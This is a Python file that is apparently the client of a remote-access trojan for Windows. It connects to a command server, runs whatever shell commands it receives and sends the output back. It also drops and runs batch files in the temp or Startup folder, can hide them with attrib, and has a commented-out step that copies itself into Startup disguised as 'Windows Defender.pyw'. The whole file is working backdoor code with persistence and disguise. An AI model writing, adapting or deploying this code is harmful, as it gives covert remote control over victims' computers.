import socket
from subprocess import check_output, CalledProcessError
from pickle import dumps
from os import getlogin, getenv, startfile, system, chdir


class Socket:

    header = 10
    established = False
    cmd_received = False

    def connect_to_server(self):
        try:
            self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.active_socket.connect((socket.gethostname(), 20000))
            Socket.established = True
            print("Connection established")
        except (ConnectionRefusedError, TimeoutError, socket.error):
            Socket.established = False
            print("No connection established!")

    def receive_command(self):
        try:
            cmd = self.active_socket.recv(1024)
        except ConnectionResetError:
            self.established = False
            return False

        cmd = cmd.decode()
        if cmd[0:5] == "batch":
            drop_and_execute(cmd[6:])
            return True
        elif cmd[0:6] == "sbatch":
            drop_and_execute(cmd[7:], startup=True)
        else:
            try:
                output = check_output(cmd, shell=True)
            except CalledProcessError as error:
                self.send_msg(error)
                return False
            output = ''.join(chr(i) for i in output)
            self.send_msg(output)
            return True

    def send_msg(self, msg):
        try:
            msg = dumps(msg)
            msg = bytes(f"{len(msg):{self.header}}", "utf-8") + msg
            self.active_socket.send(msg)
        except(ConnectionResetError, ConnectionAbortedError, OSError):
            self.established = False


def drop_and_execute(script, execute_file=True, startup=False, hide_file=False):
    if not script:
        return
    # Format script
    script = script.replace("/n", "\n")

    # Default file name
    file_name = "mat-debug-1692.bat"

    # Create Path to drop and execute
    if startup:
        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + file_name
    else:
        path = getenv("temp") + "\\" + file_name

    # Drop file
    with open(path, "w+")as f:
        f.write(script)

    # Execute File
    if execute_file:
        startfile(path)

    # Hide File by calling Windows command
    if hide_file:
        chdir("C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
        system("attrib +h " + file_name)


def copy_to_startup(file_name):
    startup_path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
    with open(__file__, "rb")as file:
        file_bytes = file.read()
    with open(startup_path + file_name, "wb")as file:
        file.write(file_bytes)


# copy_to_startup("Windows Defender.pyw")
connection = Socket()
while True:
    if not connection.established:
        connection.connect_to_server()
        continue
    while connection.receive_command():
        pass
